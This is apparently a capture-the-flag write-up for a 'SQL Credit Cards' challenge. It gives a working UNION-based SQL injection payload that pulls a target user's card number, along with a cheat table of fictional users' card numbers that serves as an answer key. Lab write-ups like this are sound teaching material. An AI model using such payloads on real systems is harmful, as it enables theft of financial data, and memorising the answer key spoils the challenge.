# SQL Credit Cards

Find the credit card number

Get the credit card number for user: farnsworth

Enter the credit card number here

## Solution

Enter

```plain
'
```

So, the SQL is

```sql
SELECT username FROM credit_cards WHERE username='$1' COLLATE NOCASE
```

I have tried many times to find out the credit card number field name. Finally, I found it is `card`.

Enter

```plain
' and 1 = 2 union SELECT card FROM credit_cards WHERE username='farnsworth
```

You will get the credit card number.

Enter

```plain
4784981000802194
```

## Cheat Table

| username   | card             |
| :--------- | :--------------- |
| admin      | 4300713381842928 |
| bender     | 4768732694626948 |
| fry        | 4385923563192160 |
| farnsworth | 4784981000802194 |
| scruffy    | 4987327898009549 |
| zoidberg   | 4912753912003772 |
